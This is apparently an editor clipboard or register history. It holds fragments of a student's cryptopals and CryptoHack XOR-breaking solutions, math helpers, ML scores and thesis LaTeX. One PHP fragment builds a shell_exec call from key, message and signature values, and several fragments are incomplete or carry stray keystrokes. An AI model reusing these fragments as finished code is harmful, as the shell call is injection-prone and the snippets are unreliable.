	        self.__index = 0
0523edf98595dfc54947bed22977e3de|file:///home/neo/cryptopals/set3/set3_sol.py|212|5|V|python
	    npr = random.RandomState(123)
a00d426019cea1f81dcc6a05e8db6fc3|file:///home/neo/cryptopals/set3/set3_sol.py|207|1|V|python
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(rand.extract_number())
	    print(npr.randint(0, 2**32))
	    print(npr.randint(0, 2**32))
	    print(npr.randint(0, 2**32))
	    print(npr.randint(0, 2**32))
	    print(npr.randint(0, 2**32))
	    print(npr.randint(0, 2**32))
cf66b1bdfedbc580fdccaeef6d4ae536|file:///home/neo/cryptopals/set3/set3_sol.py|209|30|v|python
	Incorrect PKCS7 padding
960262bdf9f0c3d30bde2471ae38f252|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|192|9|V|tex
	        $command = escapeshellcmd("python /var/www/html/verify.py $public_key $message $signature");
39f208b21b8ed09888b3790f5489567c|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|193|1|V|tex
	        $output = shell_exec($command)jjjVj
	        if ($output == 1){
	            $check = true;
	        } else {
	            $check = false;
	        }
d562f3b53f8722739c1f261d492650b7|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|181|9|V|tex
	        if ( strlen( $stored_pk ) <= 32 ) {
05b9df22f20efd5103c6d1cab09f84af|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|184|1|V|tex
	            if ( $check && $user_id ) {
	                // Rehash using new hash.
	                wp_set_password( $public_key, $user_id );
	                $stored_pk = wp_hash_password( $public_key );
	            } else{
	               return apply_filters( 'check_password', false, $credentials, $stored_pk, $user_id );
	            }
	        }
	        ...
3e4849f0a5f389459bf20c344398dd12|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|172|9|V|tex
	        if (isset($_COOKIE["nonce-message"])){
8976108caa46b66e4c490c20246dff75|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|15|1|V|text
	0.7478587718064105
508a8d11a223b24314bcf8e64d38c859|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|2|1|V|text
	dense: True
	tfidf: False
	clear_data: True
	stem: True
	lemmatize: True
	add_location: False
	add_keywords: False
b9eff0bb8f6337a9693eeb7a9a92260f|file:///home/neo/Documents/epl448/disaster-tweets/final-scores/best.txt|21|1|V|text
	0.7596346318902222
fb495974280d5daf3b887b6c5a18a3cf|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|10|1|V|tex
	All human things are subject to decay. And when fate summons, Monarchs must obey.
1348189f4599ad1bb5431a063d55d937|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|7|19|V|tex
	\title{EPL448 - Team Project Report}
	\author{Alexandros Philippou
	\and
	Stelios Stephani
	\and
	Neophytos Christou}
	\begin{multicols}{2}
4925607f8a916414fbc7a120bf3a9f2b|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|4|1|V|tex
	\usepackage{multicol}
3e10320e30b2837d0fd5c8ef5dc07248|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|20|1|V|tex
	\end{multicols}
2a0b0b12c0faac6f18e518d0d81bb145|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|12|1|V|tex
	\begin{multicols}{2}
07a4f56d1c31ffc7fcf7b2e6e759a44e|file:///home/neo/Documents/epl448/disaster-tweets/report/report.tex|1|23|v|tex
	, twocolumn
1b404383e18bca2c13f6b526bad15d78|file:///home/neo/cryptohack/general/solve.py|5|14|V|python
	    for i in arr:
	        flag += chr(i)
	    print(flag)
8e6c87a034a7a9db0492c34a347d9920|file:///home/neo/cryptohack/general/solve.py|4|20|v|python
	parameter_list
14210d2cb153d9d39cb7c0e0ec0d2388|file:///home/neo/cryptohack/general/solve.py|4|23|v|python
	ewpression
97e7e722a2ad3e963deb10048b7cea62|file:///home/neo/cryptohack/general/solve.py|11|14|v|python
	 63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d
97e7e722a2ad3e963deb10048b7cea62|file:///home/neo/cryptohack/general/solve.py|11|14|v|python
	 63727970746f7b596f755f77696c6c5f62655f776f726b696e675f776974685f6865785f737472696e67735f615f6c6f747d
81889d282445e18932abd2bbe5f56f04|file:///home/neo/cryptohack/general/solve.py|15|5|V|python
	    flag = codecs.encode(codecs.decode(hex_str, 'hex').decode(), 'utf-8')
424e772ee5fc28b49f43075efa6b92aa|file:///home/neo/cryptohack/general/encoding/pwntools_example.py|17|1|V|python
	print("Received type: ")
afd14b78802b5154dd4f1d968bb867c1|file:///home/neo/cryptohack/general/encoding/pwntools_example.py|19|23|V|python
	print(received["type"])
	print("Received encoded value: ")
	print(received["encoded"])
984fa5c0ad36e04791ba68ce483da5df|file:///home/neo/cryptohack/general/encoding/encoding.py|4|1|V|python
	import Crypto.Util.number as number
2997a0864344ed39fc89928d46c0d785|file:///home/neo/cryptohack/general/encoding/pwntools_example.py|36|12|V|python
	    switch (enc_type){
	            
	            }
3e1c543c2d677918399cbe71d62915c8|file:///home/neo/cryptohack/general/encoding/pwntools_example.py|36|12|V|python
	    encodings = {
	            }
ee8d4dcad386f5a456087fa6224347a9|file:///home/neo/cryptohack/general/encoding/encoding.py|7|1|V|python
	    return codecs.encode(codecs.decode(hexstring, 'hex').decode('latin-1'), 'latin-1')
c2e9ac0f91865616d4fccdb7ac3338f4|file:///home/neo/cryptohack/general/encoding/pwntools_example.py|25|12|v|python
	''.join([chr(ord(x) - 13) for x in encoded]).decode('latin-1')
5b7f33be48f19c25e1af2f96cffc569f|file:///home/neo/cryptohack/general/encoding/pwntools_example.py|28|59|v|python
	ascii
7dfca8b5d0d6f1e60096e3ea282fbe72|file:///home/neo/cryptohack/general/xor/xor.py|2|1|V|python
	import ..
205b122821b62d21141231d8fb78b07a|file:///home/neo/cryptohack/general/xor/xor.py|2|1|V|python
	from ..
de8dce273936167016cc1148726d4b5d|file:///home/neo/cryptohack/general/xor/xor.py|3|21|v|python
	/path/to/application/app/folder
003a18f083c30d50911c317af0a0bd97|file:///home/neo/cryptohack/general/xor/xor.py|4|1|V|python
	import set1.
a62cf7cd63fd45fb989e90c9008334b3|file:///home/neo/cryptohack/general/xor/xor.py|3|1|V|python
	sys.path.insert(1, '~/cryptopals')
	from set1.set1_sol import _
dfe36db3b0508310b05f13b0a0efec30|file:///home/neo/cryptopals/set1/set1_sol.py|5|1|V|python
	import enchant
ee55f2d84c2a6359da4aef7e6f5fa1e9|file:///home/neo/cryptopals/set1/set1_sol.py|65|1|V|python
	    for i in range(256):
	        xored_bytes = b''
	        for byte in ciphertext:
	            xored_bytes += bytes([byte ^ i])
	        try:
	            xored_str = xored_bytes.decode('utf-8')
	            score = 0
	            sentences = xored_str.split()
	            for word in sentences:
	                for c in word:
	                    if c.upper() in letterFrequency:
	                        score += letterFrequency.get(c.upper())
	                    else:
	                        score -= 5
	                if word.isprintable() and dictionary.check(word) and len(word) > 1:
	                    score += 10
	            if score > threshold:
	                string_scores[xored_str] = score
	        except (UnicodeDecodeError, AttributeError):
	            pass
	    sorted_scores = sorted(string_scores, key=string_scores.get, reverse=True)
b8eab88e9f5e351dcd7982b40d8c82fd|file:///home/neo/cryptopals/set1/set1_sol.py|64|1|V|python
	    string_scores = {}
553a15c7086f7ce1f7479e947e823d60|file:///home/neo/cryptopals/set1/set1_sol.py|85|1|V|python
	    sorted_scores = sorted(string_scores, key=string_scores.get, reverse=True)
f56b26a03d342c067e7129d1876af704|file:///home/neo/cryptohack/general/xor/xor.py|5|1|V|python
	def single_byte_xor_decypt(text: bytes) -> bytes:
235e7c641d34a1f1c9b8b7888ce172cc|file:///home/neo/cryptohack/general/xor/xor.py|3|1|V|python
	sys.path.insert(1, '~/cryptopals')
e815cb8cf1d589dde777a72ade7b65e9|file:///home/neo/cryptohack/general/xor/xor.py|16|34|v|python
	1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736
c5e09e4c07cf8563974a0b9855ed156e|file:///home/neo/cryptohack/general/xor/xor.py|21|1|V|python
	    encoded = b'73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d' 
	    decoded = decode_hexstring(encoded)
87c320a42e83212b95859e5c450ef4f6|file:///home/neo/cryptohack/general/xor/xor.py|26|17|v|python
	73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d
0e77b8d83704294bb3dda8f6b7e9defb|file:///home/neo/cryptohack/general/xor/xor.py|25|1|V|python
	    encoded = b'0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104' 
	    decoded = decode_hexstring(encoded)
	    decrypted_list = multi_byte_xor_decrypt(decoded)
	    for decrypted in decrypted_list:
	        print decrypted
b31d55302e865d2d49b22a5f50a10825|file:///home/neo/cryptohack/general/xor/xor.py|13|5|V|python
	    possible = []
9601c945539d775bb24d65ac7e3a3abf|file:///home/neo/cryptohack/general/xor/xor.py|22|5|V|python
	    for decrypted in decrypted_list:
b5d71321a8ab664f7a397dcf433d065d|file:///home/neo/cryptopals/set1/set1_sol.py|43|1|V|python
	def xor_bytes(bytes1: bytes, bytes2: bytes) -> bytes:
	    if not isinstance(bytes1, bytes) or not isinstance(bytes2, bytes):
	        raise TypeError
	    if len(bytes1) != len(bytes2):
	        raise Exception('Chunks must have the same length')
	    xored = bytearray(bytes1)
	    for i, b in enumerate(bytes2):
	        xored[i] ^= b
	    return bytes(xored)
59e1ff28c53cf341d2c4a10b7e733020|file:///home/neo/cryptohack/general/xor/xor.py|36|13|V|python
	            print(keylength)
111efceb321ab7a2c6c9339dcb8d48c0|file:///home/neo/cryptohack/general/xor/xor.py|35|13|V|python
	            print(key)
c95c4c6e7889c2fd68bd6c4b004cf329|file:///home/neo/cryptohack/general/xor/xor.py|32|13|V|python
	            print('-----------\n')
3a7712fd73067c49d33900d66ac80b4b|file:///home/neo/cryptohack/general/xor/xor.py|29|17|V|python
	                print(decr_b)
75da7b5963319a32ab5e872caed7423d|file:///home/neo/cryptohack/general/xor/xor.py|30|21|V|python
	                    print('test')
b13b36b5429254ca21397de64609b5c7|file:///home/neo/cryptohack/general/xor/xor.py|29|17|V|python
	                print(known_bytes[i])
b3e344d679574818413e113ebf2cd653|file:///home/neo/cryptohack/general/xor/xor.py|35|9|V|python
	        print(key)
4d038ca71dda73361d0f8d35a7de02e5|file:///home/neo/cryptohack/general/xor/xor.py|30|10|V|python
	                print(decr_b)
	                print(known_bytes[i])
2f4a8dbd4cdc82139c47d0df78b540ac|file:///home/neo/cryptohack/general/xor/xor.py|32|27|v|python
	'test'
4657c44c4e6afe9dd611fd1ce00db19a|file:///home/neo/cryptohack/general/xor/xor.py|32|21|V|python
	                    print(key)
c77d9e6c36dfe154df332a8d73839a8e|file:///home/neo/cryptohack/general/xor/xor.py|25|9|V|python
	        print('newkeu')
7b864c2d2431d773c5628be38aaea232|file:///home/neo/cryptohack/general/xor/xor.py|30|21|V|python
	                    print(bytes(b))
49ae606414725941bf3bcbfb9dc64829|file:///home/neo/cryptohack/general/xor/xor.py|30|21|V|python
	                    print(b)
522396a5b3d22493e52b79508b312bee|file:///home/neo/cryptohack/general/xor/xor.py|34|9|V|python
	        print(excess)
c92f2581e9a5a721cb4a9132fd15fc72|file:///home/neo/cryptohack/general/xor/xor.py|34|9|V|python
	        blocks = len(encrypted) // keylength
3020d686d05a9ceaa9334820237e6715|file:///home/neo/cryptohack/general/xor/xor.py|34|9|V|python
	        for block in range(blocks):
c8f9eddc4f373f3d4ee4e994f790b71e|file:///home/neo/cryptohack/general/xor/xor.py|34|13|V|python
	            decrypted += xor_bytes(key, encrypted[block * keylength: (block + 1) * keylength])
170904b798a579bf201d555327066b34|file:///home/neo/cryptohack/general/xor/xor.py|34|9|V|python
	        print(key[excess:])
8adb6bc8d3b2098a40b9b19ade417e69|file:///home/neo/cryptohack/general/xor/xor.py|34|9|V|python
	        print(encrypted[-excess:])
6d96352960e67db765f8d514c0d3fb1b|file:///home/neo/cryptohack/general/xor/xor.py|34|9|V|python
	        decrypted += xor_bytes(key[excess:], encrypted[-excess:])
02f2aaf3353961d39a9ae6437f9a3af2|file:///home/neo/cryptohack/general/xor/xor.py|40|9|V|python
	        decrypted += xor_bytes(key[excess], encrypted[-excess:])
0d62e22d41e5dcc7e77488e3abbdf449|file:///home/neo/cryptohack/general/xor/xor.py|38|5|V|python
	        print(decrypted[:len(known_bytes)+1])
bb82ab8e6243bdb206ac1afe009d33c7|file:///home/neo/cryptohack/general/xor/xor.py|38|9|V|python
	        print(decrypted[:len(known_bytes)])
0726af395d65bacf3d103b41bea1612f|file:///home/neo/cryptohack/general/xor/xor.py|23|5|V|python
	    print(len(encrypted))
0e4d5824c8bebaf08f60e8d27b84da24|file:///home/neo/cryptohack/general/xor/xor.py|40|9|V|python
	        print('----\n')
0a495c5b866565217747d6ee3789b5d7|file:///home/neo/cryptohack/general/xor/xor.py|34|9|V|python
	        print(keylength)
691123c83b18d20a3f291ea10317e00f|file:///home/neo/cryptohack/general/xor/xor.py|37|9|V|python
	        print(len(keystream))
759ae248cdba93508eaf7f03bbda6bb1|file:///home/neo/cryptohack/general/xor/xor.py|26|34|V|python
	        for i in range(keylength):
	            if i < len(known_bytes):
	                for b in range(256):
	                    decr_b = chr(encrypted[i] ^ b)
	                    if decr_b == known_bytes[i]:
	                        key += bytes(chr(b), 'utf-8')
	                        break
85e479e271472fbc026d613d78425031|file:///home/neo/cryptohack/general/xor/xor.py|24|20|v|python
	keylength
0404a41c29ba70bf0d0f97efe2ab6b68|file:///home/neo/cryptohack/general/xor/xor.py|25|9|V|python
	        if i < len(known_bytes):
1a4286600f877ef321d04fca778f527c|file:///home/neo/cryptohack/general/xor/xor.py|30|5|V|python
	    for keylength in range(2,20,1):
189fe403b404533fb8939afd3d7bf78f|file:///home/neo/cryptohack/general/xor/xor.py|30|5|V|python
	    key = b''
734e52b8646fba1fc794588c97b3af17|file:///home/neo/cryptohack/general/xor/xor.py|39|5|V|python
	    print('----\n')
c20d9342e9a6ea2264006c555f4bda7d|file:///home/neo/cryptohack/general/xor/xor.py|36|21|v|python
	min_key
588689cbe3bac49e5c92d936762c847e|file:///home/neo/cryptohack/general/xor/xor.py|34|39|v|python
	known_bytes
ca32cf75a5eaa7e3e2a42acf7388b4bc|file:///home/neo/cryptohack/general/xor/xor.py|32|9|V|python
	        key = min_key
8e4dbc0dada68f89cb9180cfd5e5500d|file:///home/neo/cryptohack/general/xor/xor.py|33|9|V|python
	        decrypted = b''
5e8dbb8a63b7d4874261cd823f0cc8b7|file:///home/neo/cryptohack/general/xor/xor.py|32|1|V|python
	        decrypted = b''
	        key = min_key
	        excess = len(encrypted) % len(key)
	        blocks = len(encrypted) // len(key)
65136571314aa15b67b73491b86fa31a|file:///home/neo/cryptohack/general/xor/xor.py|33|13|V|python
	            decrypted = b''
	            key = min_key
cb369dcb4c3ad822c6e2964771214c38|file:///home/neo/cryptohack/general/xor/xor.py|27|1|V|python
	            decr_b = chr(encrypted[i] ^ b)
	            if decr_b == known_bytes[i]:
71afc3498722919af19db3fb3e98972c|file:///home/neo/cryptohack/general/xor/xor.py|40|13|V|python
	                key 
23ba075825d246287c0ed47d9e095eb0|file:///home/neo/cryptohack/general/xor/xor.py|37|20|v|python
	decr_b == known_bytes[i]:
d9443f2f733dcf795ecb73e47bea6a0e|file:///home/neo/cryptohack/general/xor/xor.py|30|28|v|python
	bytes(chr(b), 'utf-8')
2bd3cb43ddb35d7edb099ae08b3571ed|file:///home/neo/cryptohack/general/xor/xor.py|39|50|v|python
	decr_b
c808720604c2888827d5c053e9e8a4eb|file:///home/neo/cryptohack/general/xor/xor.py|46|21|V|python
	                    print(decrypted)
621caee0198f9f1df1f1145a70de443a|file:///home/neo/cryptohack/general/xor/xor.py|37|13|V|python
	            key = mid_key
8d03a49d7a3517f6cce6cde173707c7d|file:///home/neo/cryptohack/general/xor/xor.py|51|25|V|python
	                        print(decrypted)
ec7a2fe4ac4de3151b3c2b83c1987a93|file:///home/neo/cryptohack/general/xor/xor.py|33|5|V|python
	    print(min_key)
abddb3f1054873d31a888cf1c6e8fcaf|file:///home/neo/cryptohack/general/xor/xor.py|46|21|V|python
	                    print(keystream)
c9df0695bc65053feeeb8525ea96079f|file:///home/neo/cryptohack/general/xor/xor.py|38|1|V|python
	            print('test')
b5e2197ecb1bb4f55806a91e27e31f7f|file:///home/neo/cryptohack/general/xor/xor.py|36|9|V|python
	        print(mid_key)
539be1cf8aca422be0434cd200994992|file:///home/neo/cryptohack/general/xor/xor.py|36|13|V|python
	            print(mid_key)
61ef6c8fd0c27528a0429b9dc9e07cf6|file:///home/neo/cryptohack/general/xor/xor.py|38|17|V|python
	                print(key)
cc315c4929dd5efc2955758eaf73bb36|file:///home/neo/cryptohack/general/xor/xor.py|37|17|V|python
	                key = mid_key
6fd21f8ef09a52e069beb56c5baf9ee2|file:///home/neo/cryptohack/general/xor/xor.py|34|9|V|python
	        mid_key = min_key
494f28d7892d15df90d640026833d132|file:///home/neo/cryptohack/general/xor/xor.py|50|25|V|python
	                        y
f166607d603ec0b3499666cce2713d3f|file:///home/neo/cryptohack/general/xor/xor.py|35|29|V|python
	            mid_key = min_key
	            print(mid_key)
e2734f15325545daf7c73644f5033120|file:///home/neo/cryptohack/general/xor/xor.py|41|21|v|python
	key + bytes(chr(b), 'utf-8')
f5ced5b679a5ce8d4d5951b4ee9cfa68|file:///home/neo/cryptohack/general/xor/xor.py|33|5|V|python
	    for extra_len in range(1):
6df1b6486f10c858fd397d985b4661f8|file:///home/neo/cryptohack/general/xor/xor.py|33|9|V|python
	        for i in range(extra_len + 1):
f16f5322d114945569c933ddc91983fd|file:///home/neo/cryptohack/general/xor/xor.py|33|13|V|python
	            mid_key = min_key
c2f11e88f09b1206bc82efc3b5997d30|file:///home/neo/cryptohack/general/xor/xor.py|34|5|V|python
	        key = mid_key
d688fbdd72a7de658f97f5d3366f6952|file:///home/neo/cryptohack/general/xor/xor.py|42|13|V|python
	            # print(decrypted)
69cec6a8d728a411332063d9ef14b2ca|file:///home/neo/cryptohack/general/xor/xor.py|43|13|V|python
	                # mid_key = key
	                # print(mid_key)
221a9cfb12f77d8c1f8d948dfdbc2e01|file:///home/neo/cryptohack/general/xor/xor.py|43|17|v|python
	print(decrypted)
236455cc90628414652cd3b476180a5d|file:///home/neo/cryptopals/.gitignore|2|1|V|
	__pycache__
cbc30a67b855a15b81114b60f58c82ff|file:///home/neo/Documents/epl448/output2.txt|58|1|V|text
	freq= 15 n_learning_rate= 0.1 n_max_depth= 10 n_loss= exponential 
	Cross validation average F1:  0.7274746523580973
92d767dd44d568199259a8d1498c7495|file:///home/neo/Documents/diplomatiki/auth.js/.gitignore|1|1|V|
	*.log
	*.fls
	*.gz
	*.fdb_latexmk
	*.aux
	*.bbl
0631360c196d8f5311f007e2b88b973d|file:///home/neo/ccsc/echoes/sourcery.py|10|1|V|python
	filename = 'flag.png'
	with open(filename, 'rb') as f:
	    content = f.read()
	
	#secret = binascii.hexlify(content)
ee8e4bc81ef8603f2fcb0234670114d0|file:///home/neo/cryptohack/general/xor/xor.py|48|1|V|python
	    img
435ed7e9f07f740abf511a62c00eef6e|file:///home/neo/cryptohack/general/xor/xor.py|49|15|v|python
	filename
9a0364b9e99bb480dd25e1f0284c8555|file:///home/neo/cryptohack/general/xor/xor.py|50|9|v|python
	content
b3cf50036e3dc856da10b5f734a4d8e3|file:///home/neo/cryptohack/general/xor/xor.py|48|1|V|python
	    flag_image = 'general/xor/flag.png'
	    with open(flag_image, 'rb') as f:
	        flag_contents = f.read()
	    flag_hex = binascii.hexlify(flag_contents)
697056bb86d2bc34718eda1ec9a021f7|file:///home/neo/cryptohack/general/xor/xor.py|59|5|V|python
	    secret_content = 
b7caa2c2b1267d46fae880f89549dfa7|file:///home/neo/cryptohack/general/xor/xor.py|56|5|V|python
	    print(lemur_hex)
75a4d42f37d32d3a8be2358e04e15495|file:///home/neo/cryptohack/general/xor/xor.py|62|18|v|python
	lemur_contents ^ flag_contents
e2750f6021e7a0a1c7d11ffc497874a0|file:///home/neo/cryptohack/general/xor/xor.py|56|11|v|python
	lemur_contents
2c36c739baa5ee39fd1d9c5d928a115e|file:///home/neo/cryptohack/general/xor/xor.py|50|5|V|python
	    with open(flag_image, 'rb') as f:
84078559a9c8e7aa15a218276aa21b7d|file:///home/neo/cryptohack/general/xor/xor.py|51|5|V|python
	    flag_hex = binascii.hexlify(flag_contents)
5754dbd0ae0263fef16fcffb6851a358|file:///home/neo/cryptohack/general/xor/xor.py|53|5|V|python
	    with open(lemur_image, 'rb') as f:
c4e4a6fc0337461234398f8c4f037f5c|file:///home/neo/cryptohack/general/xor/xor.py|55|5|V|python
	    print(flag_contents)
9d20afaabb4c408b868b72e926a60880|file:///home/neo/cryptohack/general/xor/xor.py|50|21|v|python
	f.read()
ae50dd420b7954205741d7f58c06a067|file:///home/neo/cryptohack/general/xor/xor.py|54|5|V|python
	        lemur_contents = f.read()
	
b2bd7431ab4a6d0bc278a1c25384385b|file:///home/neo/cryptohack/general/xor/xor.py|58|1|V|python
	    print(flag_contents[:50])
025381b52c81b7efc37a990216e61304|file:///home/neo/cryptohack/general/xor/xor.py|60|1|V|python
	    print(flag_contents[:10])
3008228a408d0903924c8bf9659221e7|file:///home/neo/cryptohack/general/xor/xor.py|60|29|V|python
	    print(flag_contents[:10])
	    print(lemur_contents[:10])
f3f5e760448150b8be48f0e087c4f771|file:///home/neo/cryptohack/general/xor/xor.py|68|29|V|python
	    # print(flag_contents[-500:])
	    # print(lemur_contents[-500:])
c673b934dd15c6064c9754e6d53100b8|file:///home/neo/cryptohack/general/xor/xor.py|58|1|V|python
	    flag_contents = flag_contents[145:]
87d2c25594796f8142a184694adbc5f2|file:///home/neo/cryptohack/general/xor/xor.py|61|1|V|python
	
	    # for i, _ in enumerate(flag_contents):
	    #     if flag_contents[-i-1] != lemur_contents[-i-1]:
	    #         print(i)
	    #         break
8cfa4ff61748db08595a5a8108b684e4|file:///home/neo/cryptohack/general/xor/xor.py|59|5|V|python
	    print(str(flag_contents))
bb8d017c9f20ffdf237d18a268fec001|file:///home/neo/cryptohack/general/xor/xor.py|59|36|v|python
	str(flag_contents).index('EXtdate')
591659f0328a24a5834d0ac46874fb55|file:///home/neo/cryptohack/general/xor/xor.py|59|5|V|python
	    print(str(flag_contents).index('EXtdate'))
075ed3db2255bad0b0b72ace65a492c4|file:///home/neo/cryptohack/general/xor/xor.py|60|1|V|python
	    print(len(flag_contents))
521d8ac02a446de84714750108e82ddb|file:///home/neo/cryptohack/general/xor/xor.py|60|5|V|python
	    print(len(str(flag_contents)))
d6d7fc4c2798449b107d5995e5e6da31|file:///home/neo/cryptohack/general/xor/xor.py|61|38|v|python
	str(lemur_contents).index('EXtdate')
ccb2837a28ed821aab18b984e18a4ae4|file:///home/neo/cryptohack/general/xor/xor.py|68|16|v|python
	zip(str(lemur_contents),str(flag_contents))
9e518efa0154895f365a2985a6a79843|file:///home/neo/cryptohack/general/xor/xor.py|63|32|V|python
	    print(flag_contents[-300:])
	    print(lemur_contents[-300:])
	
e875b82b8a10097931fb52163d7fc3c3|file:///home/neo/cryptohack/general/xor/xor.py|66|1|V|python
	        secret_contents += bytes(chr(flag_contents[i] ^ lemur_contents[i]), 'utf-8')
d8de02dc482ddafa61a00cd4272e8d38|file:///home/neo/cryptohack/general/xor/xor.py|67|64|v|python
	), 'utf-8')
c0678e76cc43707c7de3eaec01d1309b|file:///home/neo/cryptohack/general/xor/xor.py|67|9|V|python
	        secret_contents += flag_contents[i] ^ lemur_contents[i]
b697af1f7595cec9084315038ab026f4|file:///home/neo/cryptohack/general/xor/xor.py|68|5|V|python
	    secret.write(secret_contents)
	    secret.close()
e412cdb13d6d30444b11c4a6baf9c3c4|file:///home/neo/cryptohack/general/xor/xor.py|68|18|v|python
	secret_contents
d9653a033493f5affd75c17ae9f6b409|file:///home/neo/cryptopals/set1/set1_sol.py|116|1|V|python
	def decrypt_repeating_xor(ciphertext_bytes: bytes, log_info=False):
	    if not isinstance(ciphertext_bytes, bytes):
	        raise TypeError
	    ciphertext = bytearray(ciphertext_bytes)
	    min_dist = 100
	    min_keysize = 100
	    for keysize in range(2,40,1):
	        samples = list()
	        distances = 0
	        blocks = len(ciphertext) // keysize
	        for i in range(0, keysize * blocks, keysize):
	            samples.append(ciphertext[i:i+keysize])
	        for i in range(1,blocks - 1,1):
	            distances += hamming(samples[0], samples[i])
	        avg_dist = (distances/ blocks)/keysize
	        if avg_dist < min_dist:
	            min_dist = avg_dist
	            min_keysize = keysize
	    if log_info:
	        print("Key size:", min_keysize, " [ score:" ,avg_dist, "]")
a225d84685d7787d4f9cd0ebb4ae6056|file:///home/neo/cryptopals/set1/set1_sol.py|163|1|V|python
	def hamming(str1: bytes, str2: bytes):
	    if len(str1) != len(str2):
	        raise Exception('Strings must have the same length')
	    binary1 = ''.join(format(c, '08b') for c in str1)
	    binary2 = ''.join(format(c, '08b') for c in str2)
	    dist = 0
	    for c1, c2 in zip(binary1, binary2):
	        dist += (c1!=c2)
	    return dist
b0bfcb0c2db584694746a3df948b7a74|file:///home/neo/cryptohack/general/xor/xor.py|93|5|V|python
	    decrypt_repeating_xor(lemur_contents, True)
65cceb17f522b73b33071da03a4f330d|file:///home/neo/cryptohack/general/xor/xor.py|44|1|V|python
	
	def decrypt_repeating_xor(ciphertext_bytes: bytes, log_info=False):
	    if not isinstance(ciphertext_bytes, bytes):
	        raise TypeError
	    ciphertext = bytearray(ciphertext_bytes)
	    min_dist = 100
	    min_keysize = 100
	    for keysize in range(2,40,1):
	        samples = list()
	        distances = 0
	        blocks = len(ciphertext) // keysize
	        for i in range(0, keysize * blocks, keysize):
	            samples.append(ciphertext[i:i+keysize])
	        for i in range(1,blocks - 1,1):
	            distances += hamming(samples[0], samples[i])
	        avg_dist = (distances/ blocks)/keysize
	        if avg_dist < min_dist:
	            min_dist = avg_dist
	            min_keysize = keysize
	    if log_info:
	        print("Key size:", min_keysize, " [ score:" ,avg_dist, "]")
	
	def hamming(str1: bytes, str2: bytes):
	    if len(str1) != len(str2):
	        raise Exception('Strings must have the same length')
	    binary1 = ''.join(format(c, '08b') for c in str1)
	    binary2 = ''.join(format(c, '08b') for c in str2)
	    dist = 0
	    for c1, c2 in zip(binary1, binary2):
	        dist += (c1!=c2)
	    return dist
3adeaf7ff785b745c8d7ce9b395f0ed9|file:///home/neo/cryptohack/general/xor/xor.py|62|5|V|python
	    flag ^ lemur
8defc3460ad4d9441685ec1c1e4a5dd5|file:///home/neo/cryptohack/general/xor/xor.py|67|54|v|python
	raw_bytes
a92f629665da97d57ce55696a3b5144f|file:///home/neo/cryptohack/general/xor/xor.py|68|5|V|python
	    Image.frombytes()
569fcead426b9e76242cd745ab206974|file:///home/neo/cryptohack/general/xor/xor.py|63|1|V|python
	    print(len(lemur_contents))
98c4d437b8063b3ea572e54b0356b070|file:///home/neo/cryptohack/general/xor/xor.py|3|1|V|python
	sys.path.insert(1, '~/cryptohack')
1671e70a8027c982e3bebb058ff2e26f|file:///home/neo/cryptohack/general/mathematics/mathematics.py|16|1|V|python
	    # print(gcd(a, b))
75f3335161d20d9ee70da741971665f5|file:///home/neo/cryptohack/general/mathematics/mathematics.py|13|5|V|python
	    print(gcd(p, q))
170af2f5e538ec722a008b8b6de0ea24|file:///home/neo/cryptohack/general/mathematics/mathematics.py|13|5|V|python
	    v = 1/y
655b9d75f33481a08056f3a3c5d5694c|file:///home/neo/cryptohack/general/mathematics/mathematics.py|12|1|V|python
	    y = b % a
9690a71bf974d40f0046e0a08d6f8926|file:///home/neo/cryptohack/general/mathematics/mathematics.py|11|1|V|python
	    u = 1/x
e47da1e39aac9877702ac0e88e7df753|file:///home/neo/cryptohack/general/mathematics/mathematics.py|10|1|V|python
	    x = a % b
db4d14658edf9b0009d50d46299b82da|file:///home/neo/cryptohack/general/mathematics/mathematics.py|19|1|V|python
	        r = old_r - q * r
	        old_r = r
5cb3bc8fc0595cf6863a82262cc3c928|file:///home/neo/cryptohack/general/mathematics/mathematics.py|10|10|V|python
	    s = 0
	    t = 1
	    r = b
	    old_s = 1
	    old_t = 0
	    old_r = a
	
	    while r != 0:
	        q = old_r // r
	        r = old_r - q * r
	        old_r = r
	        s = old_s - q * s
	        old_s = s
	        t = old_t - q * t
	        old_t = t
	
	    return old_r, t, s
44b78064daa657c7e1a7b8074d4da495|file:///home/neo/cryptohack/general/mathematics/mathematics.py|16|5|V|python
	    temp_y = 1
f9eb8c09f0b970d8f9dcc848fb79d933|file:///home/neo/cryptohack/general/mathematics/mathematics.py|15|5|V|python
	    temp_x = 1
f14155c555f9b4d7c17439487df262bb|file:///home/neo/cryptohack/general/mathematics/mathematics.py|29|5|V|python
	    print(gcd)
d5892975ebb790c9ebb9bc54d474b207|file:///home/neo/cryptohack/general/mathematics/mathematics.py|29|1|V|python
	    print(modular_congruent(11, 6))
e4f83c845c03956189ae167deb8aa31d|file:///home/neo/cryptohack/general/mathematics/mathematics.py|29|1|V|python
	    print(pow(3, 17, 17))
37df26f479cc0b0fd3d306ac7fa7b929|file:///home/neo/cryptohack/general/mathematics/mathematics.py|29|15|V|python
	    print(pow(3, 17, 17))
	    print(pow(5, 17, 17))
48139ffcbcd32d7219e4e6f78f4f0076|file:///home/neo/cryptohack/general/data-formats/data_formats.py|1|1|V|python
	#!/bin/env/python3
7c5baab865ee473ffac0b87f99366111|file:///home/neo/cryptohack/general/data-formats/data_formats.py|5|5|V|python
	    print(keypair)
15f5885650156c282ffefc2b31c24f80|file:///home/neo/cryptohack/general/data-formats/data_formats.py|16|5|V|python
